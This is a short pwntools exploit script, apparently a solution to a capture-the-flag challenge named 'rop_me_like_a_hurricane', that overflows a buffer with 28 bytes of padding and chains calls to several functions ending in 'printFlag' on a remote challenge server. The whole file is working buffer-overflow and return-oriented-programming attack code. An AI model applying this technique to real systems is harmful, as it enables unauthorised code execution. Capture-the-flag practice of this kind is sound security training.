from pwn import *

#r = process("./rop_me_like_a_hurricane")
r = remote("chal.tuctf.com", 31058)
elf = context.binary = ELF("./rop_me_like_a_hurricane")
rop = ROP(elf)

context.terminal = ["tmux", "splitw", "-v"]
#gdb.attach(r)

r.recv()
rop.call(elf.symbols["B"])
rop.call(elf.symbols["C"])
rop.call(elf.symbols["A"])
rop.call(elf.symbols["printFlag"])

payload = ""
payload += "A" * 28
payload += str(rop)
r.sendline(payload)

print(r.recv())
